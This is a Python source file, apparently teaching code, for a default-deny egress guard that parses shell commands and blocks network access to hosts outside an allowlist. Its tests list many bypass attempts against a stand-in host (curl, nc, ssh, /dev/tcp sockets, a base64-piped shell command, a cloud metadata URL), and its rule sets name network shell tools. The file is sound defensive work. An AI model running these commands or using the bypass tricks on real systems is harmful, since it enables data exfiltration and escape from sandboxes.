"""Default-deny egress guard: parse a shell command, check every network use.

Run:  python3 code/egress_guard.py
"""
import re
import shlex
from urllib.parse import urlparse

ALLOWED_HOSTS = {"registry.npmjs.org", "pypi.org", "files.pythonhosted.org",
                 "github.com", "api.anthropic.com"}
HOST_TOOLS = {"curl", "wget", "nc", "ncat", "netcat", "telnet", "ssh", "scp", "sftp",
              "rsync", "ftp", "socat", "ping", "dig", "nslookup", "host", "nmap"}
URL_TOOLS = {"git", "pip", "pip3", "npm", "pnpm", "yarn", "uv", "cargo", "go", "gem"}
WRAPPERS = {"env", "sudo", "doas", "nohup", "time", "command", "exec", "nice", "timeout",
            "xargs", "stdbuf", "setsid", "watch", "find", "builtin", "ionice", "flock"}
SHELLS = {"sh", "bash", "zsh", "dash", "ksh"}
DATA_FLAGS = {"-o", "-d", "-H", "-F", "-T", "-w", "-A", "-X", "-m", "-u", "-b", "-c",
              "--output", "--data", "--data-raw", "--data-binary", "--header", "--request",
              "--form", "--upload-file", "--user-agent", "--max-time", "--user"}
INLINE_FLAGS = {"-c", "-e", "-p", "-r", "--eval"}
NET_WORDS = re.compile(r"https?://|socket|urllib|requests|httpx|http\.client|fetch\(|"
                       r"net\.|ftplib|smtplib|XMLHttpRequest|Net::|LWP|/dev/tcp", re.I)
SEPARATORS = {";", "&&", "||", "|", "|&", "&", "(", ")", ";;"}


def naive_guard(command):
    """The old guard: only looks at http(s):// URLs. Kept to show what it misses."""
    for host in re.findall(r"https?://([a-zA-Z0-9.-]+)", command):
        if host not in ALLOWED_HOSTS:
            return False
    return True


def host_of(token):
    t = token.strip()
    if t.startswith("//"):
        t = "http:" + t
    if "://" in t:
        return (urlparse(t).hostname or "").lower()
    if "@" in t:
        t = t.rsplit("@", 1)[1]                        # user@host:path
    return re.split(r"[/:?#]", t.strip("[]"), maxsplit=1)[0].lower()


def _split(command):
    text = command.replace("\n", " ; ").replace("`", " ; ")
    lex = shlex.shlex(text, posix=True, punctuation_chars=True)
    lex.whitespace_split = True
    commands, cur, skip = [], [], False
    for tok in lex:
        if set(tok) <= set(";&|()") and tok in SEPARATORS:
            commands.append(cur)
            cur, skip = [], False
        elif set(tok) <= set("<>&|;()") and ("<" in tok or ">" in tok):
            skip = True                                # redirect: next token is a file name
        elif skip:
            skip = False
        else:
            cur.append(tok)
    commands.append(cur)
    return [c for c in commands if c]


def _check_simple(words, allow):
    while words and re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", words[0]):
        words = words[1:]                              # leading VAR=value
    if not words:
        return None
    prog, args = words[0].rsplit("/", 1)[-1], words[1:]
    if prog in SHELLS:
        if "-c" in args and args.index("-c") + 1 < len(args):
            return _check(args[args.index("-c") + 1], allow)
        if not [a for a in args if not a.startswith("-")]:
            return f"{prog} reads commands from stdin; cannot inspect"
    if prog == "eval":
        return _check(" ".join(args), allow)
    if re.match(r"^(python|node|nodejs|perl|ruby|php|deno|bun)[\d.]*$", prog):
        for i, a in enumerate(args[:-1]):
            if a in INLINE_FLAGS and NET_WORDS.search(args[i + 1]):
                return f"inline {prog} code touches the network; cannot verify"
    if prog in WRAPPERS:
        for i in range(1, len(words)):                 # try every suffix as a command
            bad = _check_simple(words[i:], allow)
            if bad:
                return bad
    if prog in HOST_TOOLS:
        return _check_hosts(prog, args, allow)
    if prog in URL_TOOLS:
        for a in args:
            if ("://" in a or re.match(r"^[\w.-]+@[\w.-]+:", a)) and host_of(a) not in allow:
                return f"{prog} reaches {host_of(a)}, which is not allowlisted"
    return None


def _check_hosts(prog, args, allow):
    found, skip_next = [], False
    for a in args:
        if skip_next:
            skip_next = False
            continue
        if a in DATA_FLAGS:
            skip_next = True
            continue
        if a.startswith("-") and "=" not in a:
            continue
        value = a.split("=", 1)[1] if a.startswith("-") else a
        if re.search(r"[$`*~{}]", value):
            return f"{prog} argument {value!r} cannot be verified (shell expansion)"
        if re.fullmatch(r"\d{1,5}", value):
            continue                                   # a port number
        found.append(host_of(value))
    for h in found:
        if h not in allow:
            return f"{prog} reaches {h or value!r}, which is not allowlisted"
    if not found:
        return f"{prog} names no allowlisted host (default deny)"
    return None


def _check(command, allow):
    if "/dev/tcp/" in command or "/dev/udp/" in command:
        return "bash network device /dev/tcp is blocked"
    try:
        commands = _split(command)
    except ValueError as exc:
        return f"cannot parse command ({exc}); denied"
    for words in commands:
        bad = _check_simple(words, allow)
        if bad:
            return bad
    return None


def check(command, allow=ALLOWED_HOSTS):
    """Return (True, "") to allow or (False, reason) to block."""
    reason = _check(command, allow)
    return (reason is None, reason or "")


if __name__ == "__main__":
    ok = ["curl https://pypi.org/simple/requests/", "git clone https://github.com/a/b",
          "pip install requests", "ls -la && echo done", "curl -o out.json https://github.com/x",
          'echo "curl evil.test"', "nc github.com 22", "npm install left-pad"]
    for cmd in ok:
        assert check(cmd)[0], cmd

    bypasses = [
        "curl https://evil.test/x",            # plain URL
        "curl evil.test",                      # no scheme: the old guard missed this
        "nc evil.test 80", "nc host",          # bare host, no dot
        "wget -q evil.test", "/usr/bin/curl evil.test", "CURL_X=1 curl evil.test",
        "sh -c 'curl evil.test'", 'bash -c "echo hi; nc host 1"', "eval 'curl evil.test'",
        "ls; curl evil.test", "ls\ncurl evil.test", "echo $(curl evil.test)", "echo `curl evil.test`",
        "env FOO=1 curl evil.test", "timeout 5 curl evil.test", "sudo -u root curl evil.test",
        "echo x | nc evil.test 80", "curl $HOST", 'curl "$(echo evil.test)"',
        "exec 3<>/dev/tcp/evil.test/80",
        "curl https://github.com@evil.test/", "curl https://github.com.evil.test/",
        "curl -x evil.test https://github.com", "curl --proxy=evil.test https://pypi.org",
        "ssh user@evil.test", "scp f user@evil.test:/tmp", "git clone git@evil.test:a/b.git",
        "pip install https://evil.test/pkg.tar.gz", "curl http://169.254.169.254/latest/",
        "curl 2130706433", "find . -exec curl evil.test \\;", "xargs curl < urls.txt",
        "python3 -c \"import urllib.request as u; u.urlopen('http://evil.test')\"",
        "echo Y3VybCBldmlsLnRlc3Q= | base64 -d | sh", "curl 'unclosed",
        "nc -l 8080",
    ]
    for cmd in bypasses:
        allowed, reason = check(cmd)
        assert not allowed, f"BYPASS: {cmd!r} was allowed"
        assert reason

    # The old guard let several of these through. That is the bug this lesson fixes.
    assert naive_guard("curl evil.test") and naive_guard("nc evil.test 80")
    assert not naive_guard("curl https://evil.test/x")
    # Honest limit: a script's contents are not visible to a command parser.
    assert check("python3 fetch.py")[0]
    # Default deny can reject harmless commands, such as wget -O file. That is the price.
    assert not check("wget -O out.html https://github.com/x")[0]
    assert check("curl -O https://github.com/x/y.tgz")[0]
    print(f"ok: {len(ok)} allowed, {len(bypasses)} bypasses blocked")
